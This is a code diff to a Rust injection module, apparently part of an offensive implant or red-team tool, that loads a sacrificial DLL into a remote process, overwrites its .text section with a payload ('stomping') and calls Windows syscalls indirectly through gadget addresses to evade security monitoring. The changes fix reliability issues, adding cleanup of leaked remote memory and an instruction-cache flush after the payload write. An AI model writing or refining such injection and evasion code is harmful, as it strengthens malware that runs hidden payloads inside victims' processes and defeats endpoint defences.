@@ -263,6 +263,26 @@ struct ModuleInfo {
 ///
 /// Uses `NtQueryInformationProcess` → `ProcessBasicInformation` to get the
 /// PEB address, then walks `Ldr->InMemoryOrderModuleList`.
+///
+/// # TOCTOU Considerations (P2-22)
+///
+/// This function reads the remote PEB's `InMemoryOrderModuleList` without
+/// taking a snapshot.  Between the first call (to select a sacrificial DLL)
+/// and the second call (after `load_dll_remote` to locate the newly loaded
+/// DLL), the module list may change due to concurrent DLL loads/unloads in
+/// the target process.  This is acceptable because:
+///
+/// 1. The re-enumeration after `load_dll_remote` always reads a *fresh* copy
+///    of the module list — it does not reuse stale state from the first call.
+/// 2. If the sacrificial DLL disappears between calls, `select_sacrificial_dll`
+///    would have already chosen it and `load_dll_remote` would load a fresh copy.
+/// 3. If a *different* DLL is loaded between calls, it does not affect our
+///    selection — we search by name in the post-load enumeration.
+/// 4. The window is narrow (only the duration of `load_dll_remote`) and the
+///    risk of the *exact same* DLL being unloaded in that window is negligible.
+///
+/// The initial enumeration's only purpose is to pick a sacrificial DLL name
+/// that is *not* currently loaded — stale data there is harmless.
 unsafe fn enumerate_remote_modules(
     process_handle: *mut c_void,
 ) -> Result<Vec<ModuleInfo>> {
@@ -555,6 +575,24 @@ unsafe fn load_dll_remote(
         ],
     );
     if status < 0 {
+        // P2-23: NtCreateThreadEx failed — free the DLL path memory we
+        // allocated above before returning the error.  Without this cleanup
+        // the allocation would leak in the target process.
+        let free_target = crate::syscalls::get_syscall_id("NtFreeVirtualMemory");
+        if let Some(ref free_tgt) = free_target {
+            let mut free_size: usize = 0;
+            let mem_release: u32 = 0x00008000; // MEM_RELEASE
+            let _ = do_syscall(
+                free_tgt.ssn,
+                free_tgt.gadget_addr,
+                &[
+                    process_handle as u64,
+                    &mut base_addr as *mut usize as u64,
+                    &mut free_size as *mut usize as u64,
+                    mem_release as u64,
+                ],
+            );
+        }
         return Err(anyhow!("NtCreateThreadEx for LoadLibraryA failed: {status:#x}"));
     }
 
@@ -577,7 +615,9 @@ unsafe fn load_dll_remote(
     // Always close the thread handle — use syscall_NtClose as guaranteed fallback.
     let _ = crate::syscalls::syscall_NtClose(thread_handle as u64);
 
-    // Free the DLL path memory
+    // P2-23 (success path): Free the DLL path memory allocated above.
+    // This runs on the happy path; the NtCreateThreadEx failure branch
+    // also frees the same allocation before returning the error.
     let free_target = crate::syscalls::get_syscall_id("NtFreeVirtualMemory");
     if let Some(ref free_tgt) = free_target {
         let mut free_size: usize = 0;
@@ -758,6 +798,33 @@ unsafe fn stomp_text_section(
     );
     if status < 0 {
         return Err(anyhow!("NtWriteVirtualMemory (stomp) failed: {status:#x}"));
+    }
+
+    // P3-13: Flush instruction cache after payload write.
+    //
+    // On x86/x64 the instruction cache is coherent with data writes, so
+    // NtFlushInstructionCache is a no-op.  On ARM64 (Windows on ARM) or
+    // certain virtualized environments with split TLBs, stale cached
+    // instructions may be executed without this flush.  Non-fatal: log
+    // and continue regardless of return value.
+    if let Some(flush_tgt) = crate::syscalls::get_syscall_id("NtFlushInstructionCache") {
+        let flush_status = do_syscall(
+            flush_tgt.ssn,
+            flush_tgt.gadget_addr,
+            &[
+                process_handle as u64,
+                text_va as u64,
+                payload.len() as u64,
+            ],
+        );
+        if flush_status < 0 {
+            log::warn!(
+                "injection_delayed_stomp: NtFlushInstructionCache returned 0x{:08X} (non-fatal on x64)",
+                flush_status as u32
+            );
+        }
+    } else {
+        log::debug!("injection_delayed_stomp: NtFlushInstructionCache syscall not available");
     }
 
     // Restore protection to RX
